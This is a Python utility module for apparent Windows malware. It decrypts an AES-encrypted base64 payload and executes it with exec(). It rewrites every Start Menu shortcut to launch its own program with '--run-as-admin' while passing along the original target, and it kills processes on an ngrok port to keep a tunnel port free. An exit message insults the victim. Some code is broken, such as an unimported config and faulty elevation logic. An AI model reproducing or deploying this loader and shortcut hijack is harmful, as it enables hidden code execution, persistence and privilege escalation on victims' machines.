#main_utils.py
from win32com.client import Dispatch
import ctypes
import sys
import base64
import os
import shutil
import subprocess
import argparse
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import win32com.client




def get_shortcut_target(shortcut_path):
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortcut(shortcut_path)
    return shortcut.TargetPath

def start_launcher(launcher_path: str, exit_after_launcher_start=True):
    subprocess.run([launcher_path])


def unhide_file(file_name):
    cwd = os.getcwd()
    subprocess.run(["attrib", "-h", os.path.join(cwd, file_name)])


def move(file_name: str, destination: str):
    file_name = os.getcwd() + "\\" + file_name
    shutil.copy2(file_name, destination)
    os.remove(file_name)


def b64decode(x: str) -> bytes:
    return base64.b64decode(x)


def decrypt_payload(encrypted_blob, key):
    key = b64decode(key)
    encrypted_blob = b64decode("".join(encrypted_blob.split()))
    iv = encrypted_blob[:16]
    ciphertext = encrypted_blob[16:]
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    return (decryptor.update(ciphertext) + decryptor.finalize()).decode()


def run_payload(pld_string: str, key: str):
    exec(decrypt_payload(pld_string, key))


from win32com.client import Dispatch


def update_shortcut(shortcut_path, new_target_exe, arguments=""):
    # Create a shortcut object using WScript.Shell
    shell = Dispatch("WScript.Shell")
    shortcut = shell.CreateShortcut(shortcut_path)

    # Preserve original properties
    original_arguments = shortcut.Arguments
    original_working_dir = shortcut.WorkingDirectory
    original_description = shortcut.Description
    original_icon_location = shortcut.IconLocation
    original_hotkey = shortcut.Hotkey
    original_window_style = shortcut.WindowStyle

    # Change the target executable
    shortcut.TargetPath = new_target_exe
    shortcut.Arguments = arguments  # Optional, set additional arguments if necessary

    # Reapply original properties
    shortcut.WorkingDirectory = original_working_dir
    shortcut.Description = original_description
    shortcut.IconLocation = original_icon_location
    shortcut.Hotkey = original_hotkey
    shortcut.WindowStyle = original_window_style

    # Save the modified shortcut
    shortcut.Save()



def update_all_startmenu_shortcuts(new_target:str):
    # Get all shortcuts in the Start Menu
    start_menu = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs")
    for file in os.listdir(start_menu):
        if file.endswith(".lnk"):
            update_shortcut(
                os.path.join(start_menu, file), 
                new_target,
                f'--run-as-admin --delegate-launch="{get_shortcut_target(os.path.join(start_menu, file))}"'
            )




import socket
def test_port_availability(port):
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind(('127.0.0.1', port))
        server_socket.listen(5)
        server_socket.close()
        return True
    except Exception:
        return False
import psutil



def _exit(message:str):
    print(message)
    exit(1)


def kill_process_by_port(port):
    try:
        # Find PID using the port
        pid = next((conn.pid for conn in psutil.net_connections(kind='inet') if conn.laddr.port == port), None)
        
        if pid:
            # Kill the process using the PID
            process = psutil.Process(pid)
            process.terminate()  # Gracefully terminate, use kill() for forceful termination
            process.wait()  # Wait for process termination
            print(f"Process with PID {pid} using port {port} has been terminated.")
        else:
            print(f"No process found using port {port}.")
    
    except psutil.NoSuchProcess:
        print(f"No process found with PID {pid}.")
    except psutil.AccessDenied:
        print(f"Access denied to terminate process with PID {pid}.")
    except Exception as e:
        print(f"Error: {e}")
def free_port(failif_path:str):
    for i in range(0, 5):
        if not test_port_availability(config.NGROK_PORT):
            kill_process_by_port(config.NGROK_PORT)
            break
    if not test_port_availability(config.NGROK_PORT):
        update_all_startmenu_shortcuts(failif_path)
        _exit("FUCK: am quitting this game but this user is too fucking annoying")


def argument_parse():
    parser = argparse.ArgumentParser(description="A simple CLI tool")
    parser.add_argument("--run-as-admin", action="store_true", help="Run as administrator")
    parser.add_argument("--delegate-launch", type=str, help="Delegate launch to another process")
    return parser.parse_args()





def rerun_as(args:str):
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        ctypes.windll.shell32.ShellExecuteW(
            None, 
            "runas", 
            sys.executable, 
            args, 
            None, 
            1
        )